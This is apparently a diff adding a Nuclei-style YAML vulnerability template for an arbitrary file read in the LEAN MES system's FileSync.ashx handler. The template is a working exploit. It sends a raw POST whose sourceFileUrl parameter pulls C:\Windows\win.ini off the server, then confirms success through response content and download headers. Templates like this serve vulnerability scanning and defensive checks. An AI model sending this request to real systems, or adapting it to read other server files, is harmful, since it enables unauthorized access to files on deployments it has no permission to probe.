@@ -1,0 +1,32 @@
+id: poc-yaml-skt-lean-mes-filesync-ashx-anyfile-read
+info:
+  name: 深科特 LEAN MES系统 FileSync.ashx 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - raw:
+      - |
+        POST /Handler/FileSync.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        type=DownLoad&sourceFileUrl=C:\Windows\win.ini
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[fonts]"
+          - "bit app support"
+        part: body
+      - type: word
+        words:
+          - "filename=win.ini"
+        part: header
+      - type: word
+        words:
+          - "application/octet-stream"
+        part: header
